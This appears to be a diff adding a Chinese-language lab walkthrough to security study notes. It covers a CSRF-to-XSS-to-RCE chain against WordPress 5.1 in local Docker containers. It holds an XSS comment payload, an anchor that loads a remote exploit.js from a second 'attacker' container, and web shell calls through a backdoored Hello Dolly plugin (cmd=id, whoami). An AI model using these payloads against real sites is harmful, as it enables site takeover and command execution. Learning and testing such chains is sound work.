@@ -5549,7 +5549,7 @@ HTML 添加了基于 SVG、Canvas、WebGL 及 CSS3 的 3D 功能，可以在浏�
 
 
 
-### 从 XSS 到 RCE 
+### 从 CSRF 到 RCE 
 
 #### WordPress
 
@@ -5610,24 +5610,92 @@ HTML 添加了基于 SVG、Canvas、WebGL 及 CSS3 的 3D 功能，可以在浏�
 #### 安装 xsstorce  容器
 
 - docker pull registry.cn-shanghai.aliyuncs.com/yhskc/xsstorce:latest
+- 漏洞容器
 - docker run --name=xsstorce -d -p 0.0.0.0:80:80 registry.cn-shanghai.aliyuncs.com/yhskc/xsstorce:latest
+  - 攻击者远程服务器
+  - docker run --name=xsstorceAttack -d -p 0.0.0.0:82:80 registry.cn-shanghai.aliyuncs.com/yhskc/xsstorce:latest
 - docker ps
+- 浏览器访问：http://127.0.0.1/
+  - 填写 WordPress 信息，实现内容网站创建
+  - 管理员控制台访问：http://127.0.0.1/wp-admin/
+  - 备注：版本为 WordPress 5.1 
+
+
+
+#### CSRF to XSS 测试
+
+- CSRF POC 制作
+  - 登录高权限账号评论并截取上传报文，制作 POC，利用代码：
+  - <a title='Xss " onmouseover=alert(1) id=" ' rel='111'>please click me 
+  - 但是呢，这个功能需要 BurpSuite 是 专业版才可以
+  - ![1618889676965](HackerMeWeb.assets/1618889676965.png)
+- 查看上传评论的 form 表单源文件
+  - 网址：http://127.0.0.1/2021/04/20/hello-world/
+  - 在 Leave a comment 中，打开控制台，在 Elements 中找到 from 表单，看内部提交 submit 的时候，携带的key-value 内容
+- 制作 POC 文件
+  - 基于上传评论的时候，需要提交的键值对，自己造一个form 表单
+  - 示例程序：HackerMeCode\WordPress\CommentPOC.html
+  - 在浏览器中打开 POC，但是前提是需要使用高权限用户登录，如 admin 账户，才可以进行后续的测试
+  - 点击 Submit request 就可以完成 XSS
+- 查看 XSS 结果
+  - 刷新：http://127.0.0.1/2021/04/20/hello-world/
+  - 在下面就可以看到一条新的 评论，展示为 click me here
+  - 此时只需要将鼠标悬停在 click 的上面，就可以实现弹窗的出现，内容为 1
+
+
+
+####  XSS 到 RCE  测试
+
+- 插件利用（Hello_Dolly）
+
+  - 世界上第一个 WordPress 的插件，启用之后，可以在后台的右上角随机显示《Hello Dolly》这首歌里面的一句歌词。
+  - WordPress 可以使用插件，通过 JS 往插件中写入后门完成 GetShell。 
+
+- 恶意 JavaScript 文件 
+
+  - 可以访问本机82端口的 WordPress 看到js 文件，
+  - http://127.0.0.1:82/exploit.js
+
+- 构建 Exploit 
+
+  - ```javascript
+    <a title='hacker " onclick="var s=document.createElement('script');s.setAttribute('src','http://127.0.0.1:82/exploit.js');s.onload=document.body.appendChild(s);" id="' rel="123">Exploit
+    ```
+
+  - 将上述内容，进行拆解之后得到
+
+    - ![1618891575177](HackerMeWeb.assets/1618891575177.png)
+
+- CSRF 利用脚本 
+
+  - 将 Exploit 的内容放到 POC 中 comment 的 value 中
+  - 示例程序：HackerMeCode\WordPress\CommentRCEPOC.html
+
+- 执行 POC
+
+  - 浏览器打开 CommentRCEPOC.html
+  - 点击 Submit request
+  - 打开 http://127.0.0.1/2021/04/20/hello-world/
+  - 找到构建的 Exploit  链接，并点击
+
+- GetShell 
+
+  - 访问：http://127.0.0.1/wp-content/plugins/hello.php?cmd=id
+    - 可以看到 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+    - 备注：如果无法实现 getshell，需要重新登录 80端口和82端口的 WordPress，必须是127的形式登录，不能是 xforburp 的混合形式
+  - http://127.0.0.1/wp-content/plugins/hello.php?cmd=ls%20-al
+  - http://127.0.0.1/wp-content/plugins/hello.php?cmd=whoami
+  - http://127.0.0.1/wp-content/plugins/hello.php?cmd=ifconfig
+
+- CSRF->XSS->RCE 攻击链 
+
+  - ![1618892184952](HackerMeWeb.assets/1618892184952.png)
 
 
 
 
 
-
-
-
-
-
-
-
-
-
-
-
+### SSRF 
 
 
 
